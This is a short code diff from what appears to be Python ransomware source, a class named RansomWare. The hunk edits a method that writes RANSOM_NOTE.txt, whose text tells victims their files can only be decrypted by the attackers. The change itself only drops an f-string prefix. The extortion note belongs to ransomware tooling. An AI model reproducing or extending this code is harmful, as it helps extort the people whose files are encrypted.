@@ -128,7 +128,7 @@ class RansomWare:
     def ransom_note(self):
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as file:
-            file.write(f'''
+            file.write('''
             Your Computer Has Been Hacked.
             There is no way to restore your data without a special key.
             Only we can decrypt your files!
